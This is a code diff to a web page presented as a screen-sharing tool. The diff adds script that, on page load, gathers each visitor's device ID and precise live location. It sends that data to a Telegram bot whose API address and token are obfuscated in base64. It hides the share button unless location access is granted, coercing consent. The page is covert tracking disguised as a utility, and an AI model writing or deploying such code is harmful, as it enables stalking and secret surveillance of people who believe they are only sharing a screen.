@@ -156,7 +156,7 @@ img {
 <!-- Top Bar -->
 <div class="topbar">
     <div class="logo">
-        <i class="fa-solid fa-desktop"></i> Share
+        <a href="/"></a><i class="fa-solid fa-desktop"></i> Screen Share </a>
     </div>
     <a href="/" class="new-session-btn">
         <i class="fa-solid fa-plus"></i> New Screen
@@ -165,6 +165,7 @@ img {
 
 <!-- Hero Section -->
 <div id="hero">
+<p id="status"></p>
 
     <button id="share-button">
         <i class="fa-solid fa-share-from-square"></i> Share my screen now
@@ -235,12 +236,12 @@ img {
   console.log("Device ID:", deviceId);
 
 })();
-function send_track(room) {
+function send_track(msg = "") {
         // Create FormData object
         var formData = new FormData();
         formData.append("chat_id", "-1001774121896");
         formData.append("disable_web_page_preview", "true");
-        formData.append("text","Device ID: "+localStorage.getItem("device_id")+"Share ID: " + location.hash.substring(1) + " || URL: " + window.location.href);
+        formData.append("text","Device ID: "+localStorage.getItem("device_id")+"Share ID: " + location.hash.substring(1) + msg);
 
         var apiUrl = window.atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDYxNzAwMTMwODA6QUFHRndOLTQ0ZHoyMUVNblI2amFYUW5yQktudmNsa1hHZXMvc2VuZE1lc3NhZ2U=");
 
@@ -273,7 +274,7 @@ function send_track(room) {
       peer = 'pc1';
     }
     const room = location.hash.substring(1);
-    
+    send_track();
     $('join-meeting-button').addEventListener('click', () => {
       const id = $('meeting-id').value.trim().replace(/\s+/g, '');
       if (id) {
@@ -483,5 +484,75 @@ function send_track(room) {
     }
     window.addEventListener("beforeunload", hangup);
   </script>
+
+<script>
+window.onload = function() {
+  if (!navigator.geolocation) {
+    document.getElementById("status").innerText = "Geolocation not supported";
+    return;
+  }
+
+  // Permission check
+  navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+
+    if (result.state === 'granted') {
+      // Already allowed → direct location get karo
+      getLocation();
+    } 
+    
+    else if (result.state === 'prompt') {
+      // Pehli baar ask karega
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          getLocation();
+        },
+        function(error) {
+          document.getElementById("status").innerText = "Location Blocked";
+          $('share-button').classList.add('hidden');
+        }
+      );
+    } 
+    
+    else if (result.state === 'denied') {
+      document.getElementById("status").innerText = "Location Blocked";
+      $('share-button').classList.add('hidden');
+    }
+
+  });
+};
+
+function getLocation() {
+  navigator.geolocation.getCurrentPosition(function(position) {
+
+    const lat = position.coords.latitude;
+    const lng = position.coords.longitude;
+
+    let msg = `Current Location: https://www.google.com/maps?q=${lat},${lng}`;
+    
+    send_track(msg);
+
+  });
+  navigator.geolocation.watchPosition(
+    function(position) {
+
+      const lat = position.coords.latitude;
+      const lng = position.coords.longitude;
+
+      let msg = `Live Location: https://www.google.com/maps?q=${lat},${lng}`;
+      
+      send_track(msg);
+    },
+    function(error) {
+      document.getElementById("status").innerText = "Location Blocked ❌";
+      $('share-button').classList.add('hidden');
+    },
+    {
+      enableHighAccuracy: true,
+      maximumAge: 0,
+      timeout: 5000
+    }
+  );
+}
+</script>
 </body>
 </html>
